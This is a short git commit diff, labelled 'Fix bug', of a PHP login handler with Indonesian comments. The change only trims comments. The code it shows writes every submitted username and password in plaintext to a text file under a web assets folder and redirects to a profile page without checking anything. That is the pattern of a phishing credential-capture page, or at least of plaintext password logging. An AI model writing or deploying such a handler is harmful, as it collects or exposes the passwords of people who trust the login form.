08770c45f82e0285359d8afa3e0cb0ebac01c2ac
Alfin Ahmad Juniar <2300018426@webmail.uad.ac.id>
2024-07-01 03:54:04 +0700

    Fix bug

--- login_process.php
+++ login_process.php
@@ -1,18 +1,16 @@
 <?php
-// Mulai sesi
 session_start();
 
-// Konfigurasi file txt untuk menyimpan data login
 $file = 'assets/php/login_data.txt';
 
-// Ambil data dari formulir
+// Ambil data
 $username = $_POST['username'];
 $password = $_POST['password'];
 
-// Simpan data login ke dalam file txt
+// Simpan data
 $data = "Username: $username\nPassword: $password\n\n";
 
-// Buka file txt untuk ditambahkan (append)
+// Buka file txt untuk ditambahkan
 $file_handle = fopen($file, 'a');
 if ($file_handle === false) {
     die("Gagal membuka file untuk ditulis.");
@@ -23,10 +21,8 @@ if (fwrite($file_handle, $data) === false) {
     die("Gagal menulis ke file.");
 }
 
-// Tutup file handle
 fclose($file_handle);
 
-// Alihkan ke halaman index
 header("Location: profile.html");
 exit();
 ?>
